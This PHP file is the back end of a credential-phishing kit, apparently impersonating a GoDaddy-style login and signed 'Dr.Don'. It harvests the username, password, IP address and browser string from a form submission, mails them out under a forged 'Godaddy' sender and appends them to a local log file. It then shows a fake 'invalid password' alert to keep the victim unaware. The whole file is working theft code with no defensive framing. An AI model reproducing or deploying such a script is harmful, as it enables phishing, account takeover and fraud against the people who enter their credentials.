<?php
$zabi = getenv("REMOTE_ADDR");
include('wait.php');
$message .= "--++-----[ $$ Dr.Don  $$ ]-----++--\n";
$message .= "--------------  LOGIN  -------------\n";
$message .= "Username : ".$_POST['name']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Dr.Don  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "Database [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Godaddy <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);

echo "<script>alert('Invalid Email Or Password, Try Again'); window.location = 'index.php';</script>";
 //header ("Location: https://www.credit-suisse.com/media/assets/microsite/docs/investment-outlook/investment-outlook-2017-en.pdf");
?>